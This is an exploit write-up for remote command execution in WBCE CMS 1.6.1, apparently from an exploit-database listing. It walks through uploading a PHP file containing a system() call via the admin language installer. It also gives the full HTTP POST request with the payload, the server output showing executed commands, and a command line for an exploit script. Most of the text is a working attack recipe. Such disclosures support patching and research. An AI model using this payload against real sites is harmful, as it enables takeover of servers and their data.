## Exploit Title: WBCE CMS Version 1.6.1 Remote Command Execution

- **Date:** 30/11/2023
- **Exploit Author:** tmrswrr
- **Vendor Homepage:** [WBCE CMS](https://wbce-cms.org/)
- **Software Link:** [WBCE CMS 1.6.1](https://github.com/WBCE/WBCE_CMS/archive/refs/tags/1.6.1.zip)
- **Version:** 1.6.1

![WBCE_CMS Image 1](https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/1.png)

![WBCE_CMS Image 2](https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/2.png)

### POC:

1. Login with admin credentials and click on Add-ons.
2. Navigate to Language > Install Language > [https://demos6.demo.com/admin/languages/index.php](https://demos6.demo.com/admin/languages/index.php)
3. Upload `upgrade.php` with the content `<?php echo system('id'); ?>`, then click install > [https://demos6.demo.com/admin/languages/install.php](https://demos6.demo.com/admin/languages/install.php)
4. The command execution result will be displayed: 

uid=1000(soft) gid=1000(soft) groups=1000(soft)
uid=1000(soft) gid=1000(soft) groups=1000(soft)


### Post Request:

```http
POST /admin/languages/install.php HTTP/1.1
Host: demos6.demo.com
Cookie: [cookie values]
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://demos6.demo.com/admin/languages/index.php
Content-Type: multipart/form-data; boundary=---------------------------86020911415982314764024459
Content-Length: 522
Origin: https://demos6.demo.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------86020911415982314764024459
Content-Disposition: form-data; name="formtoken"

5d3c9cef-003aaa0a62e1196ebda16a7aab9a0cf881b9370c
-----------------------------86020911415982314764024459
Content-Disposition: form-data; name="userfile"; filename="upgrade.php"
Content-Type: application/x-php

<?php echo system('id'); ?>

-----------------------------86020911415982314764024459
Content-Disposition: form-data; name="submit"
```
### Response:

```
-----------------------------86020911415982314764024459--

<!-- ################### Up from here: Original Code from original template ########### -->

<!-- senseless positioning-table: needed for old modules which base on class td.content -->
<div class="row" style="overflow:visible">
<div class="fg12">
<table id="former_positioning_table">
<tr>
    <td class="content">
uid=1000(soft) gid=1000(soft) groups=1000(soft)
uid=1000(soft) gid=1000(soft) groups=1000(soft)
    <div class="top alertbox_error fg12 error-box">
        <i class=" fa fa-2x fa-warning signal"></i>
                    <p>Invalid WBCE CMS language file. Please check the text file.</p>    
                    <p><a href="index.php" class="button">Back</a></p>
```

### Exploit:

To exploit this vulnerability, use the provided Python script:

```python3 Exploit.py https://demos6.demo.com/admin/ admin password 'whoami'```
